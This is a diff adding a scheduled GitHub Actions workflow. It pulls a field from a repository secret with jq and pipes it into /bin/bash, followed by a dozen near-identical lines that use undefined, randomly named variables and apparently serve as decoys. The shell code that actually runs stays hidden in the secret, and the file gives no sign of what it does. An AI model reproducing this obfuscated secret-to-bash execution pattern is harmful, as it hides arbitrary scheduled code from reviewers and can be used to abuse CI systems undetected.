@@ -1,0 +1,28 @@
+name: suishoujxc
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: suishoujxc
+        env:
+          d72: ${{ secrets.d72 }}
+        run: |
+          echo $d72 | jq -r .k85751 | /bin/bash
+          echo $r8 | jq -r .whkh538 | /bin/bash
+          echo $awu073 | jq -r .vcx57580 | /bin/bash
+          echo $gkqib0 | jq -r .nd33910 | /bin/bash
+          echo $toolr37209 | jq -r .i85 | /bin/bash
+          echo $nb94 | jq -r .mi2 | /bin/bash
+          echo $tirv3687 | jq -r .sleey45 | /bin/bash
+          echo $eem1553 | jq -r .mbkg59 | /bin/bash
+          echo $wiy8 | jq -r .lb46 | /bin/bash
+          echo $tlev95149 | jq -r .eov49818 | /bin/bash
+          echo $c510 | jq -r .v6126 | /bin/bash
+          echo $mtt19 | jq -r .xnbwj0801 | /bin/bash
+          echo $usm66 | jq -r .pi28 | /bin/bash
+
